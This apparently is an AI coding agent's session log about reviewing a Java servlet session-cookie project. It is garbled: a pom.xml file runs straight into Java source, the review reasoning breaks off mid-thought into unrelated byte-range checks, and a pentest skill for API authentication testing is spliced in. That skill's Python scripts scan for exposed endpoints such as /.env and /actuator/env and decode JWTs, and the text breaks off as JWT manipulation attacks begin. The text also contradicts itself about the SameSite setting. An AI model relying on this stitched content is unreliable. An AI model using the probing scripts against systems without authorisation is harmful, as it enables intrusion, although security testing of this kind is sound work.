On its own it holds no vulnerability rules; its job is\nto understand the code under review, pull in the most relevant specialised\nskills from this same library, and apply them. This library contains hundreds\nof specialised skills (cryptographic audit, SQL injection, JWT verification,\nsecrets in source, deserialization, access control, and many more) whose\nindividual descriptions are often too narrow to self-trigger on a plain \"review\nthis code\" request. This skill is the entry point that finds and uses them.\n\n## When to Use\n\n- Any request to review, audit, or security-check source code\n- Any request to find vulnerabilities or check code against OWASP Top 10 / CWE\n- As the first step before the library's specialised application-security skills\n\n## Workflow\n\n### Step 1 - Understand the code\nRead every source file in scope. For each file, note in one or two lines what it\ndoes, and flag every security-relevant behaviour, e.g.:\n- SQL / database query construction (string building vs parameterised)\n- Cryptography: hashing, encryption, cipher mode, key/IV/salt handling, RNG\n- Authentication, sessions, password storage, tokens / JWT\n- Input handling, deserialization, file/path access, OS command execution\n- Network calls, TLS settings, secrets / credentials in source\nTurn these into a short list of keywords (e.g. \"sql injection\", \"cryptography\",\n\"jwt\", \"hardcoded secret\", \"deserialization\", \"xss\").\n\n### Step 2 - Find applicable skills (cheaply)\nThe other skills in this library are the sibling directories next to this\nskill's own directory. Do NOT read them all. Instead:\n1. Find this skill's directory, then its parent (the library root).\n2. Grep skill NAMES first for your Step 1 keywords, e.g. from the library root:\n   `ls | grep -iE 'crypto|sql|jwt|secret|deserial|xss|auth|password'`\n3. For the closest name matches, read ONLY the `description` frontmatter of\n   their SKILL.md (`sed -n '1,15p' <name>/SKILL.md`).\n\nSelect EVERY skill whose description clearly matches a security-relevant\nbehaviour you found in Step 1 - one or more per behaviour. Do NOT cap the count\nartificially: code that touches several concerns should match several skills,\nand that is expected. Order the selected skills by likely severity / relevance\nso the most important are handled first.\n\n### Step 3 - Apply each selected skill\nWork through the selected skills in priority order. Read each skill's body (and\nits `references/` files if present) only when you reach it - one at a time, not\nall up front - so that a long list of matches never exhausts context. Apply each\nskill's weakness table / checklist / verification criteria against the actual\ncode from Step 1, citing concrete `file:line` evidence for every check that\nfires. Some skills ship Python helper scripts - apply their *knowledge* to\nwhatever language the code is in; do not run their scripts against non-Python\ncode.\n\n### Step 4 - Report\nProduce a findings report:\n- One entry per issue: severity, CWE id, `file:line`, why it is a problem, and\n  the fix.\n- A \"Skills applied\" list naming the specialised skills you used.\n- For any security-relevant behaviour that had no matching library skill, review\n  it against general OWASP Top 10 / CWE knowledge and say you did so.\n- If nothing is wrong, say so explicitly and list what you checked.\n\n## Constraints\n\n- Report only. Do not create or modify any files unless explicitly asked.\n- Keep the library search cheap: grep names, skim descriptions, and fully read\n  skill bodies only as you apply them, one at a time. The authenticating filter / `login()` call publishes both the subject and\nthe session id, typically:\n\n```java\nreq.setAttribute(AuthAttributes.SUBJECT_ID, user.id());\nreq.setAttribute(AuthAttributes.SESSION_ID, SessionIdentifiers.newSessionId());\nchain.doFilter(req, resp);\n```\n\n`/api/logout` removes the server-side record and expires the cookie.\n\n## What the browser actually receives\n\nObserved from a real container run (Tomcat 10.1, `hostPrefix=true`, `sameSite=Strict` in `web.xml`):\n\n```\nSet-Cookie: __Host-SESSION=djEkC2S6UO1SyrAJ2Bfd4w_RrCcPENpQm6vuXg_K5EU; Path=/; Secure; HttpOnly; SameSite=Lax\nHTTP/1.1 204 No Content\nCache-Control: no-store\n```\n\n## Why each attribute is set\n\n| Choice | Reason |\n| --- | --- |\n| `HttpOnly` | Page script cannot read the session, so XSS cannot simply lift it. |\n| `Secure` | The session never travels over plain HTTP, where it can be sniffed. |\n| `Path=/` | One cookie for the whole origin; a narrower path invites shadowing games. |\n| No `Domain` | Host-only. Setting `Domain` widens the cookie to every subdomain, so one sloppy subdomain loses the session. |\n| `Max-Age` omitted (`-1`) | Dies with the browser instead of lingering for weeks on a shared machine. The server-side TTL (30 min by default) is what actually bounds the session. |\n| `SameSite=Lax` (deployment uses `Strict`) | A cross-site request does not carry the session, which shrinks the CSRF surface. `None` is rejected unless `Secure`, because browsers discard that combination anyway. |\n| `__Host-` prefix (opt-in) | Browser-enforced: only `Secure`, only `Path=/`, no `Domain`, and only settable by an HTTPS request from that exact host. Subdomains cannot plant a colliding cookie. |\n| `Cache-Control: no-store` | A cached response carrying a fresh session id is a session someone else can pick up. |\n\n## Session fixation\n\nThe identifier is the credential, so this code refuses to let a client-supplied one become one:\n\n* the identifier is read from request attributes, never from parameters, headers or cookies;\n* if the candidate equals `request.getRequestedSessionId()` — an id the client already had — the\n  request is refused with 401 and the cookie is expired instead of issued;\n* an identifier that arrived via URL rewriting (`isRequestedSessionIdFromURL()`) is refused outright,\n  and `web.xml` sets `<tracking-mode>COOKIE</tracking-mode>` so the container never puts one in a URL;\n* any container `HttpSession` that predates the login is invalidated rather than promoted.\n\nVerified end-to-end: replaying a real pre-login `JSESSIONID` as the \"provided\" identifier yields\n`401` plus `Set-Cookie: __Host-SESSION=; Max-Age=0; ...`.\n\n## Identifier quality\n\n`SessionIdentifiers.newSessionId()` is 32 bytes from `SecureRandom`, base64url without padding:\nunpredictable, carries no claims or counters an attacker can extrapolate, and survives the cookie\nvalue character set. The factory validates any *provided* identifier against the RFC 6265\n`cookie-value` octets, which keeps CR/LF, `;`, `\"` and friends out of the `Set-Cookie` header (a\nhostile id can therefore not append extra response headers).\n\n## Server-side state\n\n`SessionRegistry` holds `id -> subject, expiresAt`; the cookie is only a lookup key. `find()` treats\nan expired record as absent, and `InMemorySessionRegistry` purges stale entries on write. Authenticated\nstate deliberately does **not** live in an `HttpSession` (no `JSESSIONID` is consulted), which keeps one\nsession mechanism instead of two. Clustering requires swapping in a shared store (Redis/JDBC), or a\nsession issued by node A is unknown to node B.\n\n## Configuration\n\nKnobs are `<context-param>`s (see `WebInfrastructure`); they can narrow the cookie but never weaken it,\nand `Secure`/`HttpOnly` are not configurable at all.\n\n| Parameter | Default | Notes |\n| --- | --- | --- |\n| `auth.cookie.name` | `SESSION` | RFC 6265 token |\n| `auth.cookie.path` | `/` | must start with `/` |\n| `auth.cookie.sameSite` | `Lax` | `Strict` / `Lax` / `None` |\n| `auth.cookie.hostPrefix` | `false` | requires `Path=/` and no `Domain` |\n| `auth.cookie.maxAgeSeconds` | `-1` | must not exceed the session TTL, or startup fails |\n| `auth.session.ttlSeconds` | `1800` | absolute server-side lifetime |\n\nA `SessionRegistry` or `SessionCookieConfig` bound as a `ServletContext` attribute (listener, CDI,\nSpring) takes precedence over these defaults.\n\n## Deployment notes\n\n* Jakarta Servlet **6.0** container (Tomcat 10.1+, Jetty 11+, WildFly 27+): `SameSite` rides on\n  `Cookie.setAttribute`, added in 6.0. On a Servlet 5.0 container the same header has to be emitted with\n  `response.addHeader(\"Set-Cookie\", ...)` instead.\n* HTTPS is not optional here: `Secure` plus `__Host-` means the cookie is simply dropped otherwise.\n  Behind a TLS-terminating proxy, enable `RemoteIpFilter`/`RemoteIpValve` so `request.isSecure()` is true.\n* `web.xml` also hardens the container's own `JSESSIONID` (`http-only`, `secure`); Tomcat renders\n  `SameSite` for it through `Rfc6265CookieProcessor` in `context.xml`, which `web.xml` cannot express.\n\n## Explicitly out of scope\n\nLogin and logout CSRF tokens (logout is POST-only, which limits but does not remove the risk),\ncredential rate limiting and lockout, sliding/idle expiry, concurrent-session limits, and TLS\nconfiguration. The authentication step itself is upstream by design.\n\n## Build and test\n\n```\nmvn test       # 28 tests\nmvn package    # target/auth.war\n```\n\nVerified with: `mvn clean package` (28/28 tests, war built), the emitted `Set-Cookie` headers checked\nagainst embedded Tomcat 10.1 as above, and `src/main/webapp/WEB-INF/web.xml` validated against\n`web-app_6_0.xsd`.\n"}]}},{"type":"user","uuid":"f6f5bc04-c513-4fb6-8d8c-cb6de999dd0c","session_id":"2b41e2df-dc0b-4f8a-8b29-967490f5bc42","parent_tool_use_id":null,"message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"call_72342f761f104c359705620a","is_error":false,"content":"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\">\n  <modelVersion>4.0.0</modelVersion>\n\n  <groupId>com.example</groupId>\n  <artifactId>auth-session-cookie</artifactId>\n  <version>1.0.0-SNAPSHOT</version>\n  <packaging>war</packaging>\n  <name>Post-authentication session cookie</name>\n\n  <properties>\n    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n    <maven.compiler.release>17</maven.compiler.release>\n    <jakarta.servlet.version>6.0.0</jakarta.servlet.version>\n    <junit.version>5.10.2</junit.version>\n  </properties>\n\n  <dependencies>\n    <!-- Provided by the container (Tomcat 10.1+, Jetty 11+, WildFly 27+). Every relaxation (a wider domain, a\n * non-secure cookie, {@code SameSite=None}) has to be asked for explicitly and is validated\n * against what the browser will actually accept.\n */\npublic record SessionCookieConfig(\n        String name,\n        String path,\n        String domain,\n        int maxAgeSeconds,\n        boolean secure,\n        boolean httpOnly,\n        SameSite sameSite,\n        boolean hostPrefix) {\n\n    public enum SameSite {\n        STRICT(\"Strict\"),\n        LAX(\"Lax\"),\n        NONE(\"None\");\n\n        private final String headerValue;\n\n        SameSite(String headerValue) {\n            this.headerValue = headerValue;\n        }\n\n        public String headerValue() {\n            return headerValue;\n        }\n    }\n\n    public static final String DEFAULT_NAME = \"SESSION\";\n\n    public static final SessionCookieConfig DEFAULTS =\n            new SessionCookieConfig(DEFAULT_NAME, \"/\", null, -1, true, true, SameSite.LAX, false);\n\n    /**\n     * @param domain        {@code null} keeps the cookie host-only; setting it widens the cookie to\n     *                      every subdomain, which widens the blast radius of any XSS there\n     * @param maxAgeSeconds {@code -1} for a cookie that dies with the browser, otherwise the\n     *                      absolute lifetime of the session cookie\n     */\n    public SessionCookieConfig {\n        Objects.requireNonNull(name, \"cookie name\");\n        Objects.requireNonNull(path, \"cookie path\");\n        Objects.requireNonNull(sameSite, \"SameSite\");\n        if (!isToken(name)) {\n            throw new IllegalArgumentException(\"cookie name must be an RFC 6265 token: \" + name);\n        }\n        if (path.isEmpty() || path.charAt(0) != '/') {\n            throw new IllegalArgumentException(\"cookie path must start with '/': \" + path);\n        }\n        if (maxAgeSeconds < -1) {\n            throw new IllegalArgumentException(\"maxAgeSeconds must be -1 (session cookie) or >= 0\");\n        }\n        if (sameSite == SameSite.NONE && !secure) {\n            throw new IllegalArgumentException(\"SameSite=None is only honoured together with Secure\");\n        }\n        if (sameSite != SameSite.NONE && !secure) {\n            throw new IllegalArgumentException(\"an authentication cookie must be Secure; SameSite=\"\n                    + sameSite.headerValue() + \" is downgraded by browsers on plain HTTP anyway\");\n        }\n        if (hostPrefix) {\n            if (domain != null) {\n                throw new IllegalArgumentException(\"__Host- prefixed cookies must not carry a Domain\");\n            }\n            if (!\"/\".equals(path)) {\n                throw new IllegalArgumentException(\"__Host- prefixed cookies must have Path=/\");\n            }\n        }\n    }\n\n    /** The name the cookie is actually stored under, including the {@code __Host-} prefix. */\n    public String effectiveName() {\n        if (!hostPrefix || name.startsWith(\"__Host-\")) {\n            return name;\n        }\n        return \"__Host-\" + name;\n    }\n\n    public SessionCookieConfig withHostPrefix(boolean prefix) {\n        return new SessionCookieConfig(name, path, domain, maxAgeSeconds, secure, httpOnly, sameSite, prefix);\n    }\n\n    public SessionCookieConfig withSameSite(SameSite site) {\n        return new SessionCookieConfig(name, path, domain, maxAgeSeconds, secure, httpOnly, site, hostPrefix);\n    }\n\n    public SessionCookieConfig withMaxAgeSeconds(int seconds) {\n        return new SessionCookieConfig(name, path, domain, seconds, secure, httpOnly, sameSite, hostPrefix);\n    }\n\n    /** Copy of this configuration that expires the cookie instead of establishing it. */\n    public SessionCookieConfig expiring() {\n        return withMaxAgeSeconds(0);\n    }\n\n    private static boolean isToken(String value) {\n        for (int i = 0; i < value.length(); i++) {\n            if (!isTokenChar(value.charAt(i))) {\n                return false;\n            }\n        }\n        return !value.isEmpty();\n    }\n\n    private static boolean isTokenChar(char c) {\n        return (c >= 'a' && c <= 'z')\n                || (c >= 'A' && c <= 'Z')\n                || (c >= '0' && c <= '9')\n                || \"!#$%&'*+-.^_`|~\".indexOf(c) >= 0;\n    }\n}\n"}]}},{"type":"assistant","uuid":"34c2b15c-8340-43ee-bbb5-4e6a1ff2cbf8","session_id":"2b41e2df-dc0b-4f8a-8b29-967490f5bc42","parent_tool_use_id":null,"message":{"id":"34c2b15c-8340-43ee-bbb5-4e6a1ff2cbf8","type":"message","role":"assistant","model":"vllm-general","content":[{"type":"text","text":"I've finished reading all the main source files. Java code lives in `src/main/java/com/example/auth/`, built as a WAR via `pom.xml`.\n\n## What it does\n\n`LoginServlet` (`POST /api/login`) takes the session identifier the upstream authentication step published, records `id -> subject + expiry` in a `SessionRegistry`, and adds the session cookie to the response. `LogoutServlet` deletes the server-side record first, then expires the cookie (name/path/domain matched exactly, or the browser keeps the old copy).\n\n| File | Role |\n| --- | --- |\n| `session/SessionCookieConfig.java` | Hardened cookie settings as a validating value object; config can narrow, never weaken |\n| `session/SessionCookieFactory.java` | Builds/issues/clears the cookie, reads it back on later requests, validates the identifier |\n| `session/SessionIdentifiers.java` | 32-byte `SecureRandom`, base64url |\n| `session/{SessionRegistry,InMemorySessionRegistry}.java` | Server-side session state behind the cookie |\n| `web/{LoginServlet,LogoutServlet,AuthAttributes,AuthResponses,WebInfrastructure}.java` | Endpoints, upstream contract, response plumbing, deploy-time config |\n\n## Cookie configuration (the security-relevant part)\n\n`Secure`, `HttpOnly`, `Path=/`, **no** `Domain` (host-only), `Max-Age` omitted so it dies with the browser, `SameSite=Lax` (`Strict` in the shipped `web.xml`), optional `__Host-` prefix, and `Cache-Control: no-store`. Two properties I treated as non-negotiable:\n\n- **Session fixation.** The identifier is read only from request *attributes*. If the candidate equals `getRequestedSessionId()`, or arrived via URL rewriting, the request is refused with 401 and the cookie is expired; a pre-login `HttpSession` is invalidated rather than promoted. `web.xml` sets `<tracking-mode>COOKIE</tracking-mode>` so identifiers never enter URLs.\n- **Header integrity.** A \"provided\" identifier is validated against RFC 6265 `cookie-value` octets, so CR/LF/`;`/`\"` cannot break out of `Set-Cookie` and append response headers.\n\nAuthenticated state deliberately does not live in an `HttpSession` — one session mechanism, not two.\n\n## Verification\n\n- `mvn clean package` → **BUILD SUCCESS, 28/28 tests**, `target/auth.war` built (build output removed afterwards).\n- Real container check (embedded Tomcat 10.1): login emitted\n  `Set-Cookie: __Host-SESSION=djEkC2S6UO1SyrAJ2Bfd4w_RrCcPENpQm6vuXg_K5EU; Path=/; Secure; HttpOnly; SameSite=Lax` with 204; `GET /api/login` → 405; replaying a real pre-login `JSESSIONID` as the provided id → **401** + `Max-Age=0`; logout → 204 with the record gone.\n- `web.xml` validated against the official `web-app_6_0.xsd`.\n\nTwo notes: the tests exercise the Servlet API's `Cookie` directly (Tomcat run above covers real header rendering), and I installed Maven 3.9.9 under `/opt/apache-maven-3.9.9` to run the build — remove that directory if you don't want it. Login/logout CSRF tokens, rate limiting, and idle expiry are documented as out of scope in `README.md`, along with the Servlet 6.0 container requirement for `SameSite`.\n"}]}},{"type":"assistant","uuid":"c4e14e61-50c1-46bb-859a-91fca8b40415","session_id":"2b41e2df-dc0b-4f8a-8b29-967490f5bc42","parent_tool_use_id":null,"message":{"id":"c4e14e61-50c1-46bb-859a-91fca8b40415","type":"message","role":"assistant","model":"vllm-general","content":[{"type":"text","text":"This is a task context. result.md indicates that the code was previously implemented and is now being reviewed. Session fixation check — is there a gap?**\n\nIn `LoginServlet.presentedByIdClient`:\n```java\nprivate boolean presentedByIdClient(HttpServletRequest request, String identifier) {\n    if (request.isRequestedSessionIdFromURL()) {\n        return true;\n    }\n    String requested = request.getRequestedSessionId();\n    return requested != null && requested.equals(identifier);\n}\n```\n\nThis checks whether the candidate identifier equals the requested session ID (client-supplied JSESSIONID) or came from the URL.\n\nWait, but there's a subtle issue here. The session ID is read from a request attribute (`AuthAttributes.SESSION_ID`) set by in-container code (upstream authentication). The fixation check compares the *provided* identifier against `request.getRequestedSessionId()`.\n\nBut `getRequestedSessionId()` returns the session ID from the *JSESSIONID* cookie/URL — the container session. The new opaque session ID (e.g. a 43-char base64url) is a completely different namespace from JSESSIONID (typically hex like \"123ABCDEF...\").\n\nActually, the concern is: can a fixation attacker pre-plant the *new* session cookie (`SESSION` / `__Host-SESSION`) value? Let me think about the fixation attack:\n\nSession fixation attack: attacker obtains/predicts a session ID, plants it on the victim, and then when the victim authenticates, the server keeps the same session ID, and the attacker (who knows it) can use it.\n\nIn this design:\n- The session ID is generated server-side by the upstream authentication step (from `AuthAttributes.SESSION_ID`), not taken from the client.\n- The fixation check rejects if `identifier == request.getRequestedSessionId()`.\n\nBut here's the issue: `request.getRequestedSessionId()` is the **JSESSIONID** (container session cookie), NOT the **SESSION** (application session cookie). The application cookie `SESSION`/`__Host-SESSION` is a separate cookie from `JSESSIONID`.\n\nSo a fixation attacker would need to pre-plant the value of the `SESSION` cookie on the victim. But the value of `SESSION` is generated by the upstream auth step at login time. So the attacker can't know it in advance... unless the attacker can predict it or the upstream auth step reuses a client-supplied ID.\n\nActually, wait. Let me reconsider. The key question is: **does the fixation check actually protect against the main session fixation threat?**\n\nMain threat model for session fixation:\n- Attacker plants a session ID they know on the victim.\n- Victim logs in.\n- If the server reuses that session ID, the attacker now has the authenticated session.\n\nIn this code, the session ID issued after login comes from `request.getAttribute(AuthAttributes.SESSION_ID)` — set by the upstream auth component. If the upstream auth component always generates a fresh random ID, fixation is not possible because the attacker can't guess the ID.\n\nBut if the upstream auth component *accepts a client-supplied session ID* (e.g. if the ID were read from a request parameter/cookie), then the fixation check `presentedByIdClient` would try to catch it. But that check only compares against `request.getRequestedSessionId()` (JSESSIONID), not against the `SESSION` cookie itself.\n\nHmm, so there's a potential gap: **the fixation check does not compare the candidate session ID against the value of the existing `SESSION` cookie on the request.**\n\nLet me think about whether this is actually a real, exploitable flaw:\n\nScenario:\n1. Attacker somehow knows / plants a `SESSION` cookie value `V` on the victim (e.g. if the attacker can pre-allocate a session, or if there's a separate endpoint that issues a `SESSION` cookie before login).\n2. Victim logs in. Upstream auth generates a fresh ID `V'` (random) — different from `V`. The check `presentedByIdClient` compares `V'` against `getRequestedSessionId()` (JSESSIONID). If JSESSIONID is null or different, the check passes. The new session `V'` is issued. The attacker's planted `V` is useless.\n\nSo in the normal flow where the auth step generates a fresh random ID, the fixation check is a belt-and-suspenders measure, and the real protection is the fresh random ID.\n\nBut the documented intent (per README and code comments) is that the fixation check *is* the protection: \"if the candidate equals request.getRequestedSessionId() — an ID the client already had — the request is refused.\" This only protects against a *container session ID* (JSESSIONID) being reused, not against the *application SESSION cookie*.\n\nIs there a scenario where the app `SESSION` cookie gets planted? Only if there's some endpoint that issues a `SESSION` cookie to an unauthenticated client. In this code, `SESSION` is only issued in `LoginServlet.doPost` after authentication. So the attacker can't plant a `SESSION` cookie before login (there's no pre-login endpoint that issues it). Therefore the fixation check comparing against JSESSIONID is sufficient in *this specific* design, because the only way for an ID to be \"the client already had it\" is via JSESSIONID (the one cookie the client can already have before login).\n\nHmm, actually that's a fair defense. Wait 0x2C is 44, so 0x2D is 45. The range 0x2D-0x3A is 45-58, which excludes 0x2C=44 (comma). Good, comma excluded ✓. Excludes 0x2B? 0x2B=43 `+` is in 0x23-0x2B range. So `+` allowed. RFC 6265 allows 0x23-2B which includes `+`. ✓\n- `<`-`[` = 0x3C-0x5B = 60-91 ✓ (excludes 0x5C `\\` = 92). Good, backslash excluded ✓. Excludes 0x3B `;`? 0x3B=59, range is 58-... wait 0x3A is 58 (colon), 0x3B is 59 (semicolon). The previous range ends at 0x3A (58), next starts at 0x3C (60). So 0x3B `;` (59) is excluded ✓. Good.\n- `]`-`~` = 0x5D-0x7E = 93-126 ✓ (excludes 0x5C=92 backslash ✓).\n\nSo the whitelist correctly excludes: space (0x20), `\"` (0x22), `,` (0x2C), `;` (0x3B), `\\` (0x5C), and all control chars (0x00-0x1F). And `SessionCookieConfig.DEFAULTS` has `httpOnly=true`. The withers preserve httpOnly. So the shipped WAR always produces HttpOnly cookies.\n\nBut the type-level invariant \"HttpOnly cannot be weakened\" (which the README claims) is not enforced. This is a genuine but low-severity finding: the documented guarantee is stronger than what the type enforces. A custom `SessionCookieConfig` bound as a `ServletContext` attribute (which `WebInfrastructure` honors: \"An application can bind a SessionCookieConfig as a ServletContext attribute ... and that instance wins\") could set `httpOnly=false`, silently weakening the cookie. It does NOT look at the application's `SESSION`/`__Host-SESSION` cookie.\n\nThe threat: session fixation where the attacker pre-plants an ID that the server will adopt post-login.\n\nFor this to work, the adopted ID must be one the attacker knows in advance. The adopted ID comes from `AuthAttributes.SESSION_ID` (set by upstream auth). If upstream auth always generates a fresh random ID, the attacker can't know it → no fixation. So the real defense is \"fresh random ID from upstream.\"\n\nThe `presentedByIdClient` check is a secondary defense that catches the specific case where the upstream auth, instead of minting a fresh ID, reuses the *container session ID* (JSESSIONID) as the new session ID. In that (sloppy upstream) case, the check catches it.\n\nBut does it catch the case where upstream auth reuses the *application SESSION cookie* value? Consider a sloppy upstream that does: `sessionId = readExistingSessionCookie(req) ?? freshRandom()`. If the attacker pre-planted a `SESSION=V` cookie on the victim, and the victim's first request carries it, then upstream would reuse `V` as the session ID, and `presentedByIdClient` would NOT catch it because it only checks JSESSIONID, not the SESSION cookie. The victim's session would be `V`, which the attacker knows → fixation succeeds.\n\nSo there IS a gap: the fixation check does not compare the candidate ID against the value of the application's own `SESSION` cookie on the incoming request. Whether this is exploitable depends on the (out-of-scope) upstream auth behavior. But within this codebase, the check is narrower than the documented intent (\"an id the client already had\"). The documented intent in the code comment says: \"An identifier that was already in the request cannot be treated as proof of anything: that is exactly how a fixation attack ... gets promoted.\" But \"already in the request\" is only checked via JSESSIONID, not via the SESSION cookie itself.\n\nHowever — a key mitigating factor: in this design, the `SESSION` cookie is ONLY issued post-authentication by `LoginServlet`. There is no endpoint that issues a `SESSION` cookie to an unauthenticated client. So an attacker cannot pre-plant a `SESSION` cookie on a victim before the victim's login (there's no way to get a valid-format value that the server would later bind). The only cookie an unauthenticated client can have is `JSESSIONID` (which the container hands out). So comparing against `getRequestedSessionId()` (JSESSIONID) covers the realistic pre-login cookie namespace.\n\nWait, but the attacker doesn't need the value to be \"valid\" in advance — they just need the server to bind whatever value they planted. If upstream auth echoes back the SESSION cookie value, then any arbitrary string the attacker plants would get bound. But again, upstream auth is out of scope and by design mints a fresh ID.\n\nThis is a judgment call. I think the honest assessment is:\n- The fixation protection is sound for the realistic threat model in THIS design (SESSION cookie only issued post-auth, upstream mints fresh random IDs, check catches JSESSIONID reuse).\n- There's a residual theoretical gap: if a (hypothetical, out-of-scope) upstream ever derived the session ID from the incoming `SESSION` cookie rather than minting fresh, the check would miss it. This is worth noting as a defense-in-depth gap / latent weakness, not an active vulnerability.\n\nI'll note this as a Low/informational observation rather than a firm finding, OR include it as a Low finding with CWE-384 (Session Fixation) but clearly scoped. Maps to OWASP API2:2023 Broken\n  Authentication. Activates for requests involving API authentication testing, token\n  validation assessment, credential security testing, or API auth bypass.\n\n  '\ndomain: cybersecurity\nsubdomain: api-security\ntags:\n- api-security\n- owasp\n- authentication\n- jwt\n- session-management\n- credential-security\nversion: 1.0.0\nauthor: mahipal\nlicense: Apache-2.0\nnist_csf:\n- PR.PS-01\n- ID.RA-01\n- PR.DS-10\n- DE.CM-01\nmitre_attack:\n- T1190\n- T1059.007\n- T1552.001\n- T1003\n- T1110\n---\n# Testing API Authentication Weaknesses\n\n## When to Use\n\n- Assessing REST API authentication mechanisms for bypass vulnerabilities before production deployment\n- Testing JWT token implementation for common weaknesses (none algorithm, key confusion, missing expiration)\n- Evaluating whether all API endpoints enforce authentication or if some are unintentionally exposed\n- Testing API key generation, storage, and rotation mechanisms for predictability or leakage\n- Validating session management including token expiration, revocation, and refresh token security\n\n**Do not use** without written authorization. Authentication testing involves attempting to bypass security controls.\n\n## Prerequisites\n\n- Written authorization specifying target API and authentication mechanisms in scope\n- Valid test credentials for at least two user roles (regular user, admin)\n- Burp Suite Professional with JWT-related extensions (JSON Web Tokens, JWT Editor)\n- Python 3.10+ with `requests`, `PyJWT`, and `jwt` libraries\n- Wordlists for credential testing (SecLists authentication wordlists)\n- API documentation or OpenAPI specification\n\n## Workflow\n\n### Step 1: Authentication Mechanism Identification\n\n```python\nimport requests\nimport json\n\nBASE_URL = \"https://target-api.example.com/api/v1\"\n\n# Probe the API to identify authentication mechanisms\nauth_indicators = {\n    \"jwt_bearer\": False,\n    \"api_key_header\": False,\n    \"api_key_query\": False,\n    \"basic_auth\": False,\n    \"oauth2\": False,\n    \"session_cookie\": False,\n    \"custom_token\": False,\n}\n\n# Test 1: Check unauthenticated access\nresp = requests.get(f\"{BASE_URL}/users/me\")\nprint(f\"Unauthenticated: {resp.status_code}\")\nif resp.status_code == 200:\n    print(\"[CRITICAL] Endpoint accessible without authentication\")\n\n# Test 2: Check WWW-Authenticate header\nif \"WWW-Authenticate\" in resp.headers:\n    scheme = resp.headers[\"WWW-Authenticate\"]\n    print(f\"Auth scheme advertised: {scheme}\")\n    if \"Bearer\" in scheme:\n        auth_indicators[\"jwt_bearer\"] = True\n    elif \"Basic\" in scheme:\n        auth_indicators[\"basic_auth\"] = True\n\n# Test 3: Login and examine tokens\nlogin_resp = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": \"testuser@example.com\", \"password\": \"TestPass123!\"})\n\nif login_resp.status_code == 200:\n    login_data = login_resp.json()\n    # Check for JWT tokens\n    for key in [\"token\", \"access_token\", \"jwt\", \"id_token\"]:\n        if key in login_data:\n            token = login_data[key]\n            if token.count('.') == 2:\n                auth_indicators[\"jwt_bearer\"] = True\n                print(f\"JWT found in response field: {key}\")\n    # Check for refresh tokens\n    for key in [\"refresh_token\", \"refresh\"]:\n        if key in login_data:\n            print(f\"Refresh token found in field: {key}\")\n    # Check for session cookies\n    for cookie in login_resp.cookies:\n        print(f\"Cookie set: {cookie.name} = {cookie.value[:20]}...\")\n        if \"session\" in cookie.name.lower():\n            auth_indicators[\"session_cookie\"] = True\n\nprint(f\"\\nAuthentication mechanisms detected: {[k for k,v in auth_indicators.items() if v]}\")\n```\n\n### Step 2: Unauthenticated Endpoint Discovery\n\n```python\n# Test all endpoints without authentication\nendpoints = [\n    (\"GET\", \"/users\"),\n    (\"GET\", \"/users/me\"),\n    (\"GET\", \"/users/1\"),\n    (\"GET\", \"/admin/users\"),\n    (\"GET\", \"/admin/settings\"),\n    (\"GET\", \"/health\"),\n    (\"GET\", \"/metrics\"),\n    (\"GET\", \"/debug\"),\n    (\"GET\", \"/actuator\"),\n    (\"GET\", \"/actuator/env\"),\n    (\"GET\", \"/swagger.json\"),\n    (\"GET\", \"/api-docs\"),\n    (\"GET\", \"/graphql\"),\n    (\"POST\", \"/graphql\"),\n    (\"GET\", \"/config\"),\n    (\"GET\", \"/internal/status\"),\n    (\"GET\", \"/.env\"),\n    (\"GET\", \"/status\"),\n    (\"GET\", \"/info\"),\n    (\"GET\", \"/version\"),\n]\n\nprint(\"Unauthenticated Endpoint Scan:\")\nfor method, path in endpoints:\n    try:\n        resp = requests.request(method, f\"{BASE_URL}{path}\", timeout=5)\n        if resp.status_code not in (401, 403):\n            content_preview = resp.text[:100] if resp.text else \"empty\"\n            print(f\"  [OPEN] {method} {path} -> {resp.status_code}: {content_preview}\")\n    except requests.exceptions.RequestException:\n        pass\n```\n\n### Step 3: JWT Token Analysis\n\n```python\nimport base64\nimport json\nimport hmac\nimport hashlib\n\ndef decode_jwt_parts(token):\n    \"\"\"Decode JWT header and payload without verification.\"\"\"\n    parts = token.split('.')\n    if len(parts) != 3:\n        return None, None\n\n    def pad_base64(s):\n        return s + '=' * (4 - len(s) % 4)\n\n    header = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])))\n    payload = json.loads(base64.urlsafe_b64decode(pad_base64(parts[1])))\n    return header, payload\n\n# Analyze the JWT token\ntoken = login_data.get(\"access_token\", \"\")\nheader, payload = decode_jwt_parts(token)\n\nprint(f\"JWT Header: {json.dumps(header, indent=2)}\")\nprint(f\"JWT Payload: {json.dumps(payload, indent=2)}\")\n\n# Security checks\nissues = []\n\n# Check 1: Algorithm\nif header.get(\"alg\") == \"none\":\n    issues.append(\"CRITICAL: Algorithm set to 'none' - token signature not verified\")\nif header.get(\"alg\") in (\"HS256\", \"HS384\", \"HS512\"):\n    issues.append(\"INFO: Symmetric algorithm used - check for weak/default secrets\")\n\n# Check 2: Expiration\nif \"exp\" not in payload:\n    issues.append(\"HIGH: No expiration claim (exp) - token never expires\")\nelse:\n    import time\n    exp_time = payload[\"exp\"]\n    ttl = exp_time - time.time()\n    if ttl > 86400:\n        issues.append(f\"MEDIUM: Token TTL is {ttl/3600:.0f} hours - excessively long\")\n\n# Check 3: Sensitive data in payload\nsensitive_fields = [\"password\", \"ssn\", \"credit_card\", \"secret\", \"private_key\"]\nfor field in sensitive_fields:\n    if field in payload:\n        issues.append(f\"HIGH: Sensitive field '{field}' in JWT payload\")\n\n# Check 4: Missing claims\nexpected_claims = [\"iss\", \"aud\", \"exp\", \"iat\", \"sub\"]\nmissing = [c for c in expected_claims if c not in payload]\nif missing:\n    issues.append(f\"MEDIUM: Missing standard claims: {missing}\")\n\n# Check 5: Key ID\nif \"kid\" in header:\n    kid = header[\"kid\"]\n    # Test for path traversal in kid\n    issues.append(f\"INFO: Key ID (kid) present: {kid} - test for injection\")\n\nfor issue in issues:\n    print(f\"  [{issue.split(':')[0]}] {issue}\")\n```\n\n### Step 4: JWT Manipulation Attacks\n\n```python\n# Attack 1: Remove signature (alg: none)\ndef 